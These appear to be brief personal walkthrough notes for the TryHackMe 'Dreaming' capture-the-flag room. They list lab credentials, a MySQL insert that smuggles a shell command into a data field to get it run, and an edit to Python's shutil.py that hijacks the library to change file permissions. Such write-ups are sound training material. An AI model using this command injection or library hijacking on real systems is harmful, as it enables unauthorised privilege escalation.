@@ -1,0 +1,27 @@
+THM Dreaming 
+https://tryhackme.com/room/dreaming
+
+pluck login 
+
+10.10.113.217/app/
+password
+
+lucien:HeyLucien#@1999!
+
+dir /opt/getDreams.py and test.py
+
+bash history
+
+shutil.py
+msql -u lucien -plucien42DBPASSWORD
+
+insert into dreams (dreamer, fream) values ('cat /home/death/getDreams.py|bash','-l');
+death:!mementoMORI666!
+
+nano /usr/lib/python3.8/shutil.py
+
+def copy2(src, dst, *, follow_symlinks=True):
+add >    os.system('chmod 777 /home/morpheus/morpheus_flag.txt')
+
+and Done!
+
